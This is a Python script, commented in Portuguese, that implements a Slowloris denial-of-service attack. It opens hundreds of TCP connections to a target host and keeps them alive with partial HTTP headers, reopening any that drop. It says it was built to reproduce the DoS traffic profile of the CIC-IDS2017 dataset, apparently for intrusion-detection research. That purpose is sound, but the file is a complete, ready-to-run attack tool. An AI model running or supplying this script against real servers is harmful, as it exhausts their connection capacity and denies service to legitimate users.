#!/usr/bin/env python3
# Apoio do assistente Claude (Anthropic, Opus 4.7/4.8) na construcao; revisado e validado pelo autor.
"""
Slowloris - DoS slow-rate. Abre muitas conexoes TCP e as mantem vivas enviando
cabecalhos HTTP parciais bem devagar, sem nunca completar a requisicao. Gera
fluxos LONGOS e LENTOS (poucos pacotes/s, duracao de dezenas de segundos), o
mesmo perfil do DoS do CIC-IDS2017.

Uso: python3 slowloris.py <host> [porta] [conexoes] [segundos]
"""
import sys                       # leitura dos argumentos de linha de comando
import socket                    # criação das conexões TCP de baixo nível
import random                    # sorteio de valores nos cabeçalhos parciais
import time                      # controle de duração e dos intervalos longos
import threading                 # evento de parada compartilhado

host = sys.argv[1] if len(sys.argv) > 1 else "192.168.56.101"  # 1º argumento: IP da vítima
port = int(sys.argv[2]) if len(sys.argv) > 2 else 80          # 2º argumento: porta alvo (padrão 80)
nconn = int(sys.argv[3]) if len(sys.argv) > 3 else 200        # 3º argumento: número de conexões a abrir
dur = int(sys.argv[4]) if len(sys.argv) > 4 else 90           # 4º argumento: duração do ataque em segundos

UA = [                           # User-Agents sorteados para cada conexão
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",            # Chrome no Windows
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Firefox/121.0",          # Firefox no Linux
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",  # Safari no macOS
]

sockets = []                     # lista das conexões abertas que serão mantidas vivas
stop = threading.Event()         # evento de parada (disponível para coordenação)


def open_socket():               # abre uma conexão e envia uma requisição HTTP incompleta
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # cria um socket TCP
    s.settimeout(4)              # tempo máximo de espera de 4 segundos
    s.connect((host, port))      # conecta na porta alvo da vítima
    s.send(f"GET /?{random.randint(0, 99999)} HTTP/1.1\r\n".encode())  # envia a linha GET (com query aleatória)
    s.send(f"Host: {host}\r\n".encode())                  # envia o cabeçalho Host
    s.send(f"User-Agent: {random.choice(UA)}\r\n".encode())  # envia um User-Agent sorteado
    s.send(b"Accept-language: en-US,en,q=0.5\r\n")         # envia mais um cabeçalho, sem terminar a requisição
    return s                     # devolve o socket aberto (requisição deliberadamente incompleta)


print(f"Slowloris -> {host}:{port} | {nconn} conexoes | {dur}s")  # informa alvo, número de conexões e duração
for _ in range(nconn):           # repete para a quantidade de conexões pedida
    try:                         # protege contra falha ao abrir
        sockets.append(open_socket())  # abre a conexão e guarda na lista
    except Exception:            # se a vítima recusar
        pass                     # ignora e segue
print(f"abertas: {len(sockets)} conexoes")  # informa quantas conexões abriram de fato

t0 = time.time()                 # marca o instante de início
while time.time() - t0 < dur:    # repete até atingir a duração
    # manda 1 header parcial em cada socket pra mante-lo vivo (devagar)
    alive = 0                    # conta quantas conexões seguem vivas nesta rodada
    for s in list(sockets):      # percorre uma cópia da lista de conexões
        try:                     # tenta enviar mais um cabeçalho parcial
            s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())  # envia um cabeçalho falso para manter a conexão viva
            alive += 1           # contabiliza a conexão como viva
        except Exception:        # se a conexão caiu
            sockets.remove(s)    # remove a conexão morta da lista
            # reabre pra manter pressao
            try:                 # tenta reabrir uma nova conexão
                sockets.append(open_socket())  # mantém a pressão sobre a vítima
            except Exception:    # se não conseguir reabrir
                pass             # ignora
    print(f"  t={int(time.time()-t0)}s vivas={alive}")  # imprime o tempo decorrido e o número de conexões vivas
    time.sleep(12)   # intervalo longo = fluxo lento

for s in sockets:                # ao fim, percorre as conexões restantes
    try:                         # tenta fechar cada uma
        s.close()                # fecha o socket
    except Exception:            # se já estiver fechado
        pass                     # ignora
print("fim")                     # marca o fim do ataque
